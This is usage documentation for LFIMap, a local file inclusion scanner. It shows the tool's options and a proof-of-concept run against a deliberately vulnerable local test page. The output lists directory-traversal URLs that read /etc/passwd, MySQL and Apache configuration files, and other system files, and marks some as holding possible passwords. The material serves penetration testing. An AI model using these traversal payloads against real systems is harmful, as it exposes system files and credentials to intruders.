## Usage

### Syntax

```
$ python lfimap.py -t <target> [options]

Options

--target, -t <target>
    Target. E.g. http://www.test.com/ss.php?page=[LFI HERE]

--null, -n
    Put a null byte to bypass some controls

--user, -u <user>
    Is used to send username in basic authentication

--passw, -p <password>
    Is used to send password in basic authentication

--proxy, -w <proxy>
    Proxy support

--output, -o <file>
    Set Output file

--hexa, -x
    Encode the url to hexa
```

## Examples

### Example #1: PoC

#### Description

The following example is based on a specific vulnerable code (download it here) that doesn't properly check/sanitize user inputs and is hence vulnerable to LFI attacks. LFIMap has been tested against this application as a Proof of Concept.
Stdout

LFIMap has been called with following parameters:

```
$ python lfimap.py -t "http://127.0.0.1/poc/LFI/index.php?page=page2.txt" -o report.html
```

Here is the output on the screen:

```
 lfi detected in "page" parameter
--------------------------------------------------------------------
Made by Augusto Pereyra
Thanks to www.artsweb.com.ar
This code is distributed under GPL Licence
Detecting root path of site
--------------------------------------------------------------------

Going down 0 folder
Going down 1 folder
Going down 2 folder
Going down 3 folder
Going down 4 folder
Going down 5 folder
root path finded in: 
-------------------------------------------------------------
http://127.0.0.1/poc/LFI/index.php?page=../../../../../&
 The root of the File system was found 6 levels down
 This is a Linux System
-------------------------------------------------------------
2011-02-03 06:52:45.401371
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../proc/version&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/apache2/apache2.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/mysql/my.cnf&
Possible password detected in this file
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/sysctl.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/passwd&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/ts.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/ca-certificates.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/debconf.conf&
Possible password detected in this file
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/bash_completion.d/debconf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/xdg/user-dirs.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/gnome-vfs-2.0/modules/default-modules.conf&
(...TRUNCATED...)
```

## Wiki

More info in this site:
https://www.aldeid.com/wiki/Lfimap
